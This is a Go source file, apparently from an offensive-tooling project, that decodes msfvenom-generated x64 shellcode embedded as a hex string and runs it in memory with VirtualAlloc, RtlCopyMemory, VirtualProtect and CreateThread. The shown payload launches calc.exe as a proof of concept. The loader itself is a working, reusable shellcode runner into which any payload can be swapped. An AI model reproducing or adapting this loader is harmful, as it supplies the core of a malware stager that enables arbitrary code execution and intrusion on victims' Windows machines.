package main

import (
	"encoding/hex"
	"fmt"
	"go-inject/inject"
	"os"

	"golang.org/x/sys/windows"
)

func main() {

	// msfvenom -p windows/x64/exec CMD=calc.exe -f hex
	var payload string = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}

	// Reserve space to drop shellcode
	address := inject.VirtualAlloc(uintptr(0), len(sc), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

	// Copy Data
	inject.RtlCopyMemory(address, sc)

	// Change Protection
	inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)

	// Create thread
	thread := inject.CreateThread(address)

	// Wait for completion
	inject.WaitForSingleObject(thread, 0xFFFFFFFF)
}
